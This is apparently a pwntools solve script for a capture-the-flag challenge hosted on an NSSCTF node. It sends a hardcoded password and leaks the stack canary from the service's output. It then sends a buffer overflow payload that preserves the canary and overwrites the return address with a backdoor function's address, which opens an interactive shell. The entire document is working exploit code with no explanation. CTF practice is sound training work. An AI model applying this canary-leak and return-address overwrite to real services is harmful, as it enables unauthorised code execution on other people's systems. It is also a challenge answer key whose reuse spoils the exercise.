from pwn import *

#io = process("./service")
io = remote("node5.anna.nssctf.cn", 23435)

password = p64(0xb0361e0e8294f147) + p64(0x8c09e0c34ed8a6a9)
backdoor = 0x401256

io.recvuntil(b"word")

io.send(password)
io.recvuntil(b"\n")
canary = u64(io.recv()[0x20-0x8:0x20])
print("canary = ", hex(canary))
payload = b"a" * (0x20-8) + p64(canary) + b"a" * 8 + p64(backdoor)
io.sendline(payload)

io.interactive()

